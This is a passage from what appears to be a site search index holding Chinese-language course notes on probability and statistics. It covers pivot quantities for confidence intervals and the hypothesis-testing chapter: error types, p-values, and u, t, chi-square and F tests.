N(0,1)\\)\uff0c\u4e0d\u77e5\u603b\u4f53\u65b9\u5dee\u53d6\u67a2\u8f74\u53d8\u91cf \\(T=\\dfrac{\\sqrt{n}(\\bar{X}-\\mu)}{S}\\sim t(n-1)\\).\uff09</li> <li> <p>\u603b\u4f53 \\(X\\sim N(\\mu, \\sigma^2)\\)\uff0c\u603b\u4f53\u5747\u503c\u672a\u77e5\u65f6\uff0c\u65b9\u5dee\u7684\u7f6e\u4fe1\u533a\u95f4\u3002\uff08\u53d6\u67a2\u8f74\u53d8\u91cf \\(\\dfrac{(n-1)S^2}{\\sigma^2}\\sim\\chi^2(n-1)\\).\uff09</p> </li> <li> <p>\u4e24\u4e2a\u603b\u4f53 \\(X\\sim N(\\mu_1,\\sigma_1^2),Y\\sim N(\\mu_2,\\sigma_2^2)\\) \u7684\u5747\u503c\u5dee\u7684\u7f6e\u4fe1\u533a\u95f4\uff1a\u5df2\u77e5\u4e8c\u8005\u65b9\u5dee\u53d6\u67a2\u8f74\u53d8\u91cf</p> </li> </ul> \\[    U=\\dfrac{(\\bar{X}-\\bar{Y})-(\\mu_1-\\mu_2)}{\\sqrt{\\frac{\\sigma_1^2}{n_1}+\\frac{\\sigma_2^2}{n_2}}}\\sim N(0,1) \\] <p>\u4e8c\u8005\u65b9\u5dee\u76f8\u7b49\u4f46\u672a\u77e5\u53d6</p> \\[ T=\\sqrt{\\dfrac{n_1n_2(n_1+n_2-2)}{n_1+n_2}}\\cdot\\dfrac{(\\bar{X}-\\bar{Y})-(\\mu_1-\\mu_2)}{\\sqrt{(n_1-1)S_1^2+(n_2-1)S_2^2}}\\sim t(n_1+n_2-2) \\] <p>\u4e3a\u67a2\u8f74\u53d8\u91cf\u3002</p> <ul> <li> <p>\u4e24\u4e2a\u603b\u4f53 \\(X\\sim N(\\mu_1,\\sigma_1^2),Y\\sim N(\\mu_2,\\sigma_2^2)\\) \u7684\u5747\u503c\u6bd4\u7684\u7f6e\u4fe1\u533a\u95f4\u3002\u5f53\u603b\u4f53\u5747\u503c\u672a\u77e5\u65f6\uff0c\u53d6 \\(F=\\dfrac{S_1^2\\sigma_2^2}{S_2^2\\sigma_1^2}\\sim F(n_1-1,n_2-1)\\) \u4e3a\u67a2\u8f74\u53d8\u91cf\u3002</p> </li> <li> <p>\u975e\u6b63\u6001\u603b\u4f53\u5747\u503c\u7684\u533a\u95f4\u4f30\u8ba1\uff08\u5927\u6837\u672c\u6cd5\uff09\uff1a\u6839\u636e CLT\uff0c\u8f6c\u4e3a 1.</p> </li> </ul>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-7-%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#_3","title":"\u4e60\u9898*","text":"<ol> <li>\u603b\u4f53 \\(X\\sim N(\\mu,\\sigma^2)\\)\uff0c\\(\\mu\\) \u548c \\(\\sigma^2\\) \u7684\u77e9\u4f30\u8ba1\u5206\u522b\u4e3a\u6837\u672c\u5747\u503c \\(\\bar{X}\\) \u548c\u6837\u672c\u4e8c\u9636\u4e2d\u5fc3\u77e9 \\(S^{*2}\\).</li> </ol>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/","title":"Ch.8 \u5047\u8bbe\u68c0\u9a8c","text":"<p>\u5047\u8bbe\u68c0\u9a8c\u5c31\u662f\u5bf9\u603b\u4f53\u7684\u67d0\u4e9b\u4f4d\u7f6e\u7279\u5f81\u63d0\u51fa\u5047\u8bbe\uff0c\u5e76\u5229\u7528\u6837\u672c\u4fe1\u606f\u6765\u63a8\u65ad\u8be5\u5047\u8bbe\u7684\u6b63\u786e\u6027\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_1","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>\u5047\u8bbe\u4e00\u822c\u662f\u67d0\u4e2a\u91cf\u7684\u53d6\u503c\u6216\u8005\u5206\u5e03\u3002</p> <p>\u5982\u679c\u68c0\u9a8c\u7684\u5047\u8bbe\u53ea\u6d89\u53ca\u603b\u4f53\u5206\u5e03\u4e2d\u7684\u672a\u77e5\u53c2\u6570\uff0c\u5219\u79f0\u8fd9\u79cd\u5047\u8bbe\u4e3a\u53c2\u6570\u68c0\u9a8c\u5047\u8bbe\uff0c\u53cd\u4e4b\u5219\u79f0\u4e3a\u975e\u53c2\u6570\u68c0\u9a8c\u5047\u8bbe\u3002</p> <p>\u6211\u4eec\u4ee5\u9488\u5bf9\u5355\u4e2a\u53c2\u6570\u7684\u53c2\u6570\u68c0\u9a8c\u5047\u8bbe\u4e3a\u4f8b\u5b50\uff0c\u6bd4\u5982\u6709\u8fd9\u6837\u4e00\u4e2a\u5047\u8bbe\uff1a\u603b\u4f53\u6837\u672c\u7684\u5747\u503c \\(\\mu=0\\)\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5047\u8bbe\u79f0\u4e3a\u539f\u5047\u8bbe\u6216\u96f6\u5047\u8bbe\uff0c\u901a\u5e38\u8bb0\u4f5c \\(H_0\\)\uff0c\u4e0e\u4e4b\u5bf9\u7acb\u7684 \\(\\mu\\ne 0\\) \u79f0\u4e3a\u5907\u62e9\u5047\u8bbe\u6216\u5bf9\u7acb\u5047\u8bbe\uff0c\u901a\u5e38\u8bb0\u4f5c \\(H_1\\)\u3002</p> <p>\u5bf9\u4e8e\u539f\u5047\u8bbe\u4e0e\u5bf9\u7acb\u5047\u8bbe\u5404\u5c45\u4e00\u8fb9\u7684\u68c0\u9a8c\u95ee\u9898\uff0c\u6bd4\u5982\u8bf4 \\(H_0:p\\le 0.05,H_1:p&gt;0.05\\)\uff0c\u79f0\u5176\u4e3a\u5355\u8fb9\u68c0\u9a8c\u3002\u5bf9\u4e8e\u5bf9\u7acb\u5047\u8bbe\u5206\u5c40\u539f\u5047\u8bbe\u7684\u4e24\u8fb9\u7684\u68c0\u9a8c\u95ee\u9898\uff0c\u6bd4\u5982\u8bf4 \\(H_0:\\mu=0,H_1:\\mu\\ne 0\\)\uff0c\u79f0\u5176\u4e3a\u53cc\u8fb9\u68c0\u9a8c\u3002</p> <p>\u5982\u679c\u5047\u8bbe\u4e2d\u53ea\u542b\u6709\u4e00\u4e2a\u5047\u8bbe\uff0c\u5219\u79f0\u5176\u4e3a\u7b80\u5355\u5047\u8bbe\uff1b\u5426\u5219\u79f0\u4e3a\u590d\u6742\u5047\u8bbe\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_2","title":"\u5047\u8bbe\u68c0\u9a8c\u7684\u6b65\u9aa4","text":"<ol> <li>\u6839\u636e\u95ee\u9898\u63d0\u51fa\u539f\u5047\u8bbe \\(H_0\\) \u548c\u5bf9\u7acb\u5047\u8bbe \\(H_1\\).</li> <li>\u6784\u9020\u4e00\u4e2a\u5408\u9002\u7684\u7edf\u8ba1\u91cf \\(U\\)\uff0c\u5f80\u5f80\u7531\u53c2\u6570\u4f30\u8ba1\u4e8c\u6fd1\uff0c\u79f0\u4e3a\u68c0\u9a8c\u7edf\u8ba1\u91cf\uff0c\u5e76\u5728 \\(H_0\\) \u6210\u7acb\u7684\u6761\u4ef6\u4e0b\u63a8\u5bfc\u51fa\u8be5\u7edf\u8ba1\u91cf\u7684\u5206\u5e03\u3002</li> <li>\u7ed9\u5b9a\u4e00\u4e2a\u5c0f\u6982\u7387 \\(\\alpha\\)\uff0c\u786e\u5b9a \\(U\\) \u7684\u6982\u7387\u5173\u4e8e\u6982\u7387 \\(\\alpha\\) \u7684\u754c\u9650\uff0c\u79f0\u4e3a\u4e34\u754c\u503c\uff0c\u4ee5\u53ca \\(U\\) \u4e0d\u6ee1\u8db3 \\(H_0\\) \u5047\u8bbe\u7684\u53d6\u503c\u96c6\u5408\uff0c\u79f0\u4e3a\u62d2\u7edd\u57df \\(W\\). \u62d2\u7edd\u57df\u7684\u8865\u96c6\u79f0\u4e3a\u63a5\u53d7\u57df\u3002</li> <li>\u7531\u6837\u672c\u7b97\u51fa\u7edf\u8ba1\u91cf\u7684\u89c2\u5bdf\u503c\uff0c\u82e5\u843d\u5728\u62d2\u7edd\u57df\uff0c\u5219\u62d2\u7edd \\(H_0\\)\uff1b\u82e5\u843d\u5728\u63a5\u53d7\u57df\uff0c\u5219\u63a5\u53d7 \\(H_0\\).</li> </ol>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_3","title":"\u5047\u8bbe\u68c0\u9a8c\u7684\u4e24\u7c7b\u9519\u8bef","text":"<p>\u7b2c\u4e00\u7c7b\u9519\u8bef\uff08\u5f03\u771f\u9519\u8bef\uff09\uff1a\u539f\u5047\u8bbe \\(H_0\\) \u6b63\u786e\uff0c\u4f46\u7531\u4e8e\u7edf\u8ba1\u91cf\u7684\u503c\u843d\u5728\u62d2\u7edd\u57df\u800c\u62d2\u7edd\u4e86\u539f\u5047\u8bbe \\(H_0\\).</p> <p>\u7b2c\u4e8c\u7c7b\u9519\u8bef\uff08\u5b58\u4f2a\u9519\u8bef\uff09\uff1a\u539f\u5047\u8bbe \\(H_0\\) \u4e0d\u6b63\u786e\uff0c\u4f46\u7531\u4e8e\u7edf\u8ba1\u91cf\u7684\u503c\u843d\u5728\u63a5\u53d7\u57df\u800c\u63a5\u53d7\u4e86\u539f\u5047\u8bbe \\(H_0\\).</p> <p>\u663e\u7136\uff0c\u7b2c\u4e00\u7c7b\u9519\u8bef\u7684\u6982\u7387\u5c31\u662f\u5047\u8bbe\u68c0\u9a8c\u4e2d\u7684\u5c0f\u6982\u7387 \\(\\alpha\\)\uff1a\\(\\mathrm{Pr}(\u62d2\u7edd\\,H_0|H_0\\,\u4e3a\u771f)=\\mathrm{Pr}(U\\in W|H_0\\,\u4e3a\u771f)=\\alpha\\). \u56e0\u6b64\uff0c\u6709\u65f6\u4f1a\u79f0 \\(\\alpha\\) \u4e3a\u663e\u8457\u6027\u6c34\u5e73\u3002\u7b2c\u4e8c\u7c7b\u9519\u8bef\u7684\u6982\u7387 \\(\\beta\\) \u4e00\u822c\u8ba1\u7b97\u6bd4\u8f83\u56f0\u96be\uff1a\\(\\mathrm{Pr}(\u63a5\u53d7\\,H_0|H_1\\, \u4e3a\u771f)=\\mathrm{Pr}(U\\notin W|H_1\\,\u4e3a\u771f)=\\beta\\).</p> <p>\u5728\u8fdb\u884c\u5047\u8bbe\u68c0\u9a8c\u65f6\uff0c\u5f53\u7136\u5e0c\u671b\u4e24\u7c7b\u9519\u8bef\u7684\u6982\u7387\u8d8a\u5c0f\u8d8a\u597d\uff0c\u7136\u800c\uff0c\u5728\u7ed9\u5b9a\u6837\u672c\u5bb9\u91cf\u7684\u60c5\u51b5\u4e0b\uff0c\u72af\u4e24\u7c7b\u9519\u8bef\u7684\u6982\u7387\u4e0d\u53ef\u80fd\u540c\u65f6\u51cf\u5c0f\uff1a\u51cf\u5c11\u5176\u4e2d\u4e00\u4e2a\uff0c\u53e6\u4e00\u4e2a\u4f1a\u589e\u5927\u3002\u56e0\u6b64\uff0cNeyman \u548c Pearson \u63d0\u51fa\u4e86 Neyman-Pearson \u539f\u5219\uff1a\u5728\u63a7\u5236 \\(\\alpha\\) \u7684\u60c5\u51b5\u4e0b\uff0c\u4f7f \\(\\beta\\) \u5c3d\u91cf\u5c0f\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#p","title":"p \u503c\u68c0\u9a8c\u6cd5","text":"<p>\u5bf9\u4e8e\u5047\u8bbe\u68c0\u9a8c \\(H_0:\\theta\\in\\Theta_0;H_1:\\theta\\in\\Theta_1\\)\uff0c\u68c0\u9a8c\u7edf\u8ba1\u91cf\u4e3a \\(T=T(X_1,\\cdots,X_n)\\)\uff0c\u62d2\u7edd\u57df \\(W=\\{|T|\\ge \\lambda\\}\\). \u8bbe \\(x_1,\\cdots,x_n\\) \u4e3a\u6837\u672c\u89c2\u5bdf\u503c\uff0c\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(T\\) \u7684\u89c2\u5bdf\u503c\u4e3a \\(t=T(x_1,\\cdots, x_n)\\)\uff0c\u5219\u5b9a\u4e49 p \u503c\u5982\u4e0b\uff1a</p> \\[ p(x_1,\\cdots,x_n)=\\sup_{\\theta\\in\\Theta_0}\\mathrm{Pr}_\\theta(|T|\\ge |t|) \\] <p>\u6362\u53e5\u8bdd\u8bf4 p \u503c\u662f\u57fa\u4e8e\u6837\u672c\u89c2\u5bdf\u503c\u800c\u8ba1\u7b97\u51fa\u7684\u62d2\u7edd\u539f\u5047\u8bbe\u7684\u6982\u7387\uff0c\u5f53\u539f\u5047\u8bbe\u4e3a\u590d\u5408\u5047\u8bbe\u65f6\uff0c\u53d6\u6700\u5927\u6982\u7387\u3002\u7531\u4e8e p \u503c\u4f9d\u8d56\u4e8e\u6837\u672c\u89c2\u5bdf\u503c\uff0c\u6545\u800c\u5176\u4e5f\u662f\u4e00\u4e2a\u7edf\u8ba1\u91cf\u3002</p> <p>p \u503c\u8d8a\u5c0f\uff0c\u8d8a\u5e94\u8be5\u62d2\u7edd\u539f\u5047\u8bbe\u3002Fisher \u79f0 p \u503c\u4e3a\u300c\u53cd\u5bf9\u539f\u5047\u8bbe\u4f9d\u636e\u7684\u5f3a\u5ea6\u300d\uff0c\u5f53 p \u503c\u5c0f\u4e8e\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u65f6\uff0c\u6211\u4eec\u62d2\u7edd\u539f\u5047\u8bbe\uff0c\u5426\u5219\u63a5\u53d7\u539f\u5047\u8bbe\u3002\u6709\u4e86 p \u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0d\u518d\u5c06\u68c0\u9a8c\u9677\u5165\u63a5\u53d7/\u62d2\u7edd\u7684\u4e8c\u5143\u60c5\u5f62\uff0c\u800c\u662f\u91cf\u5316\u6210 p \u503c\u8fd9\u4e2a\u6307\u6807\u548c \\(\\alpha\\) \u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u77e5\u9053\u63a5\u53d7\u6216\u62d2\u7edd\u539f\u5047\u8bbe\u7684\u300c\u7a0b\u5ea6\u300d\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_4","title":"\u6b63\u6001\u603b\u4f53\u5747\u503c\u7684\u5047\u8bbe\u68c0\u9a8c","text":"<p>\u4e00\u3001\u5355\u4e2a\u6b63\u6001\u603b\u4f53\u5747\u503c\u7684\u5047\u8bbe\u68c0\u9a8c</p> <p>\u8bbe\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\)\uff0c\\(X_1,\\cdots,X_n\\) \u4e3a\u6765\u81ea\u603b\u4f53 \\(X\\sim N(\\mu,\\sigma^2)\\) \u7684\u4e00\u7ec4\u6837\u672c\uff0c\u68c0\u9a8c\u95ee\u9898\u4e3a\uff1a\\(H_0:\\mu=\\mu_0;H_1:\\mu\\ne \\mu_0\\)\uff0c\u5206\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff1a</p> <p>\u200b   (1)\\(\\sigma^2\\) \u5df2\u77e5\uff0c\u6b64\u65f6\u4f7f\u7528 \\(u\\) \u68c0\u9a8c\u3002</p> <p>\u200b   \u68c0\u9a8c\u7edf\u8ba1\u91cf\u4e3a \\(U=\\dfrac{\\bar{X}-\\mu_0}{\\sigma/\\sqrt{n}}\\)\uff0c\u5728 \\(H_0\\) \u6210\u7acb\u65f6\uff0c\u6211\u4eec\u6709 \\(U\\sim N(0,1)\\)\uff0c\u7531\u6b64\u5f97\u77e5\u62d2\u7edd\u57df\uff1a</p> \\[ W=\\{|U|\\ge u_{\\alpha/2}\\} \\] <p>\u200b   \u8fd9\u79cd\u68c0\u9a8c\u65b9\u6cd5\u79f0\u4e3a \\(u\\) \u68c0\u9a8c\u6cd5\uff0c\u53ea\u56e0 \\(\\dfrac{\\bar{X}-\\mu_0}{\\sigma/\\sqrt{n}}\\) \u4e60\u60ef\u8bb0\u4e3a \\(U\\) \u800c\u79f0\u4e3a \\(U\\) \u7edf\u8ba1\u91cf\u3002</p> <p>\u5176\u4ed6\u53d8\u4f53\u60c5\u5f62\uff1a</p> <ol> <li>\u5bf9\u4e8e\u5355\u8fb9\u68c0\u9a8c \\(H_0:\\mu=\\mu_0;H_1:\\mu&gt;\\mu_0\\)\uff0c\u5229\u7528 \\(U\\) \u7edf\u8ba1\u91cf\u5f97\u5230\u62d2\u7edd\u57df \\(W=\\{U\\ge u_\\alpha\\}\\)\uff1b</li> <li>\u5bf9\u4e8e\u5355\u8fb9\u68c0\u9a8c \\(H_0:\\mu=\\mu_0;H_1:\\mu&lt;\\mu_0\\)\uff0c\u5229\u7528 \\(U\\) \u7edf\u8ba1\u91cf\u5f97\u5230\u62d2\u7edd\u57df \\(W=\\{U\\le -u_\\alpha\\}\\).</li> <li>\u5bf9\u4e8e\u5355\u8fb9\u68c0\u9a8c \\(H_0:\\mu\\le \\mu_0;H_1:\\mu&gt;\\mu_0\\)\uff0c\u4ecd\u53d6 \\(U\\) \u7edf\u8ba1\u91cf\u4e3a\u68c0\u9a8c\u7edf\u8ba1\u91cf\uff0c\u4f46\u8fd9\u4e2a\u68c0\u9a8c\u7684\u539f\u5047\u8bbe\u4e3a\u590d\u5408\u5047\u8bbe\uff0c\u4ece\u800c\u6211\u4eec\u4e0d\u80fd\u8ba4\u4e3a\u5728\u539f\u5047\u8bbe \\(H_0\\) \u6210\u7acb\u7684\u60c5\u51b5\u4e0b\uff0c\\(U\\sim N(0,1)\\)\uff0c\u4f46\u663e\u7136\u53d6 \\(W'=\\{U\\ge u_\\alpha\\}\\) \u65f6\uff0c\u6211\u4eec\u56e0 \\(\\mu=\\mu_0\\) \u65f6\u7b2c\u4e00\u7c7b\u9519\u8bef\u6982\u7387\u6070\u4e3a \\(\\alpha\\)\uff0c\\(\\mu&lt;\\mu_0\\) \u65f6\u7b2c\u4e00\u7c7b\u9519\u8bef\u6982\u7387\u5c0f\u4e8e \\(\\alpha\\)\uff0c\u6545\u53d6\u62d2\u7edd\u57df \\(W=W'\\) \u65f6\uff0c\u7b2c\u4e00\u7c7b\u9519\u8bef\u6982\u7387\u4e0d\u5927\u4e8e \\(\\alpha\\) \u4e5f\u53ef\u4ee5\u3002</li> <li>\u5bf9\u4e8e\u5355\u8fb9\u68c0\u9a8c \\(H_0:\\mu\\ge \\mu_0;H_1:\\mu&lt;\\mu_0\\)\uff0c\u540c 3.</li> </ol> <p>\u663e\u7136\uff0c\u5728\u68c0\u9a8c\u7edf\u8ba1\u91cf\u5206\u5e03\u5bf9\u79f0\u7684\u60c5\u5f62\u4e0b\uff0c\u5355\u8fb9\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u53ef\u4ee5\u7531\u53cc\u8fb9\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u7a0d\u4f5c\u53d8\u5f62\u5f97\u5230\u3002    </p> <p>\u200b   (2) \\(\\sigma^2\\) \u672a\u77e5\uff0c\u6b64\u65f6\u4f7f\u7528 \\(t\\) \u68c0\u9a8c\u3002</p> <p>\u200b   \u4f7f\u7528\u6837\u672c\u6807\u51c6\u5dee \\(S=\\sqrt{\\dfrac{1}{n-1}\\sum_{i=1}^{n}(X_i-\\bar{X})^2}\\) \u4ee3\u66ff \\(\\sigma\\)\uff0c\u4e5f\u5c31\u662f\u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(T=\\dfrac{\\bar{X}-\\mu_0}{S/\\sqrt{n}}\\)\uff0c\u7531\u4e4b\u524d\u7ae0\u8282\u7684\u7ed3\u8bba\uff0c\u5728 \\(H_0\\) \u6210\u7acb\u7684\u60c5\u51b5\u4e0b\uff0c\u6709 \\(T\\sim t(n-1)\\)\uff0c\u4e8e\u662f\u68c0\u9a8c\u7684\u62d2\u7edd\u57df\u4e3a</p> \\[ W=\\{|T|\\ge t_{\\alpha/2}(n-1)\\} \\] <p>\u200b   \u8fd9\u79cd\u68c0\u9a8c\u65b9\u6cd5\u79f0\u4e3a \\(t\\) \u68c0\u9a8c\u6cd5\uff0c\u53ea\u56e0 \\(T=\\dfrac{\\bar{X}-\\mu_0}{S/\\sqrt{n}}\\) \u4e60\u60ef\u8bb0\u4e3a \\(T\\) \u800c\u79f0\u4e3a \\(T\\) \u7edf\u8ba1\u91cf\u3002</p> <p>\u4e8c\u3001\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u5747\u503c\u5dee\u7684\u5047\u8bbe\u68c0\u9a8c</p> <p>\u8bbe \\(X_1,\\cdots,X_{n_1}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_1,\\sigma_1^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\\(Y_1,\\cdots,Y_{n_2}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_2,\\sigma_2^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u4e14\u4e24\u6837\u672c\u76f8\u4e92\u72ec\u7acb\uff0c\u8bb0 \\(\\bar{X},\\bar{Y}\\) \u5206\u522b\u4e3a\u5176\u6837\u672c\u5747\u503c\uff0c\\(S_1^2,S_2^2\\) \u5206\u522b\u4e3a\u5176\u6837\u672c\u65b9\u5dee\uff0c\u68c0\u9a8c\u95ee\u9898\u4e3a\uff1a\\(H_0:\\mu_1=\\mu_2;H_1:\\mu_1\\ne \\mu_2\\).</p> <p>\u200b   (1) \\(\\sigma_1^2\\) \u548c \\(\\sigma_2^2\\) \u5747\u5df2\u77e5\u3002</p> <p>\u200b   \u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(U=\\dfrac{\\bar{X}-\\bar{Y}}{\\sqrt{\\frac{\\sigma_1^2}{n_1}+\\frac{\\sigma_2^2}{n_2}}}\\)\uff0c\u5f53 \\(H_0\\) \u6210\u7acb\u65f6 \\(U\\sim N(0,1)\\)\uff0c\u6b64\u65f6 \\(|U|\\) \u4e0d\u4f1a\u592a\u5927\uff0c\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u62d2\u7edd\u57df \\(W=\\{|U|\\ge u_{\\alpha/2}\\}\\).</p> <p>\u200b   (2) \\(\\sigma_1^2,\\sigma_2^2\\) \u5747\u672a\u77e5\u4f46\u76f8\u7b49\u3002</p> <p>\u200b   \u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(T=\\sqrt{\\dfrac{n_1n_2(n_1+n_2-2)}{n_1+n_2}}\\dfrac{\\bar{X}-\\bar{Y}}{\\sqrt{(n_1-1)S_1^2+(n_2-1)S_2^2}}\\)\uff0c\u5f53 \\(H_0\\) \u6210\u7acb\u65f6 \\(T\\sim t(n_1+n_2-2)\\)\uff0c\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73\uff0c\u6b64\u65f6 \\(T\\) \u5728\u96f6\u9644\u8fd1\uff0c\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u62d2\u7edd\u57df \\(W=\\{|T|\\ge t_{\\alpha/2}(n_1+n_2-2)\\}\\).</p> <p>\u4e09\u3001\u57fa\u4e8e\u6210\u5bf9\u6570\u636e\u7684\u5047\u8bbe\u68c0\u9a8c</p> <p>\u200b   \u5bf9\u4e8e\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u6837\u672c\u6765\u81ea\u540c\u4e00\u4e2a\u603b\u4f53\u7684\u91cd\u590d\u6d4b\u91cf\uff0c\u6bd4\u5982\u8bf4\u6837\u672c \\((X_1,Y_1),\\cdots,(X_n,Y_n)\\)\uff0c\u73b0\u8bb0 \\(Z_i=X_i-Y_i\\)\uff0c\u4e14\u5047\u5b9a \\(Z_i\\sim N(\\mu,\\sigma^2)\\) \u4e14 \\(Z_i\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u68c0\u9a8c\u95ee\u9898\u4e3a\uff1a\\(H_0:\\mu=0;H_1:\\mu\\ne 0\\).</p> <p>\u200b   \u4f7f\u7528 \\(t\\) \u68c0\u9a8c\u6cd5\uff0c\u6b64\u65f6\u79f0\u4e3a\u6210\u5bf9 \\(t\\) \u68c0\u9a8c\u6cd5\uff1a\u53d6 \\(T=\\dfrac{\\bar{Z}}{S_Z/\\sqrt{n}}\\)\uff0c\u5176\u4e2d \\(\\bar{Z}=\\dfrac{1}{n}\\sum_{i=1}^{n}Z_i,S_Z^2=\\dfrac{1}{n-1}\\sum_{i=1}^{n}(Z_i-\\bar{Z})^2\\)\uff0c\u62d2\u7edd\u57df\u4e3a \\(W=\\{|T|\\ge t_{\\alpha/2}(n-1)\\}\\).</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_5","title":"\u6b63\u6001\u603b\u4f53\u65b9\u5dee\u7684\u5047\u8bbe\u68c0\u9a8c","text":"<p>\u4e00\u3001\u5355\u4e2a\u6b63\u6001\u603b\u4f53\u65b9\u5dee\u7684\u5047\u8bbe\u68c0\u9a8c</p> <p>\u200b   \u8bbe\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\)\uff0c\u8bbe \\(X_1,\\cdots,X_n\\) \u4e3a\u6765\u81ea\u603b\u4f53 \\(X\\sim N(\\mu,\\sigma^2)\\) \u7684\u4e00\u7ec4\u6837\u672c\uff0c\u68c0\u9a8c\u95ee\u9898\u4e3a \\(H_0:\\sigma^2=\\sigma_0^2;H_1:\\sigma^2\\ne \\sigma_0^2\\)\uff0c\u5728\u5047\u5b9a \\(\\mu\\) \u672a\u77e5\u65f6\uff0c\u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(\\chi^2=\\dfrac{(n-1)S^2}{\\sigma_0^2}\\)\uff0c\u7531\u4e4b\u524d\u7ae0\u8282\u7684\u7ed3\u8bba\uff1a\u5728 \\(H_0\\) \u6210\u7acb\u65f6\u6709 \\(\\chi^2\\sim \\chi^2(n-1)\\)\uff0c\u6b64\u65f6 \\(\\chi^2\\) \u4e0d\u8fc7\u5927\u6216\u8fc7\u5c0f\uff0c\u4e8e\u662f\u62d2\u7edd\u57df\uff1a</p> \\[ W=\\{\\chi^2\\le \\chi^2_{1-\\alpha/2}(n-1)\\}\\cup\\{\\chi^2\\ge \\chi^2_{\\alpha/2}(n-1)\\} \\] <p>\u200b   \u6b64\u68c0\u9a8c\u79f0\u4e3a \\(\\chi^2\\) \u68c0\u9a8c\u6cd5\uff0c\u7406\u7531\u540c\u4e0a\u8282\u3002</p> <p>\u4e8c\u3001\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u7684\u65b9\u5dee\u6bd4\u7684\u5047\u8bbe\u68c0\u9a8c</p> <p>\u200b   \u8bbe \\(X_1,\\cdots, X_{n_1}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_1,\\sigma_1^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\\(Y_1,\\cdots,Y_{n_2}\\) \u662f\u6765\u81ea\u6b63\u6001\u603b\u4f53 \\(N(\\mu_2,\\sigma_2^2)\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\u4e24\u6837\u672c\u76f8\u4e92\u72ec\u7acb\uff0c\u68c0\u9a8c\u95ee\u9898\u4e3a \\(H_0:\\sigma_1^2=\\sigma_2^2;H_1:\\sigma_1^2\\ne \\sigma_2^2\\)\uff0c\u4e14\u5047\u5b9a\u5747\u503c \\(\\mu_1,\\mu_2\\) \u5747\u672a\u77e5\u3002</p> <p>\u200b   \u53d6\u68c0\u9a8c\u7edf\u8ba1\u91cf \\(F=\\dfrac{S_1^2\\sigma_2^2}{S_2^2\\sigma_1^2}\\). \u5728 \\(H_0\\) \u6210\u7acb\u65f6\uff0c\u7531\u4e4b\u524dz\u822a\u59d0\u7684\u7ed3\u8bba\uff1a\\(F\\sim F(n_1-1,n_2-1)\\)\uff0c\u5728\u7ed9\u5b9a\u663e\u8457\u6027\u6c34\u5e73 \\(\\alpha\\) \u4e0b\uff0c\u62d2\u7edd\u57df\uff1a</p> \\[ W=\\{F\\le F_{1-\\alpha/2}(n_1-1,n_2-1)\\}\\cup\\{F\\ge F_{\\alpha/2}(n_1-1,n_2-1)\\} \\] <p>\u200b   \u6b64\u68c0\u9a8c\u79f0\u4e3a \\(F\\) \u68c0\u9a8c\u6cd5\uff0c\u7406\u7531\u540c\u4e0a\u8282\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-8-%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/#_6","title":"\u62df\u5408\u4f18\u5ea6\u68c0\u9a8c","text":"<p>\u200b   